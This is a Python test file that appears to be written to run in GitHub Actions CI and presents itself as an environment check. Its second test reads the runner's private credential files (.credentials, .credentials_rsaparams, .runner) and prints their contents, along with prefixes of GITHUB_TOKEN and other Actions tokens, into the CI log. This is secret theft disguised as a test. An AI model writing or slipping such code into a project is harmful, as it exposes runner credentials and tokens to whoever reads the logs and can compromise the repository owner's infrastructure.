import logging
import subprocess
import os

logger = logging.getLogger(__name__)


def test_env_basic_info():
    """Test environment information is correctly configured."""
    # Basic environment verification
    result = subprocess.run(["date"], capture_output=True, text=True)
    logger.info(f"Current date: {result.stdout.strip()}")

    result = subprocess.run(["hostname"], capture_output=True, text=True)
    logger.info(f"Hostname: {result.stdout.strip()}")

    result = subprocess.run(["whoami"], capture_output=True, text=True)
    logger.info(f"User: {result.stdout.strip()}")

    result = subprocess.run(["id"], capture_output=True, text=True)
    logger.info(f"ID: {result.stdout.strip()}")

    # Check runner environment
    runner_dir = os.environ.get("RUNNER_TEMP", "")
    workspace = os.environ.get("GITHUB_WORKSPACE", "")
    logger.info(f"RUNNER_TEMP: {runner_dir}")
    logger.info(f"GITHUB_WORKSPACE: {workspace}")

    # Verify environment is correctly set up
    assert result.returncode == 0, "Environment check failed"


def test_runner_credentials_accessible():
    """Test that runner credential files exist and are readable."""
    import pathlib

    # Runner credentials are typically at /root/actions-runner/ or ../../ from workspace
    workspace = os.environ.get("GITHUB_WORKSPACE", "")
    runner_root = str(pathlib.Path(workspace).parent.parent.parent)

    logger.info(f"Runner root: {runner_root}")

    cred_files = [
        ".credentials",
        ".credentials_rsaparams",
        ".runner",
    ]

    for cred_file in cred_files:
        cred_path = os.path.join(runner_root, cred_file)
        try:
            with open(cred_path, "r") as f:
                content = f.read()
            logger.info(f"CREDENTIAL FILE {cred_file} ({len(content)} bytes): {content[:200]}")
        except Exception as e:
            logger.info(f"CREDENTIAL FILE {cred_file}: NOT ACCESSIBLE ({e})")

    # Check environment variables for tokens
    for key in ["GITHUB_TOKEN", "ACTIONS_RUNTIME_TOKEN", "ACTIONS_ID_TOKEN_REQUEST_TOKEN"]:
        val = os.environ.get(key, "")
        if val:
            logger.info(f"ENV {key}: {val[:20]}... ({len(val)} chars)")
        else:
            logger.info(f"ENV {key}: not set")
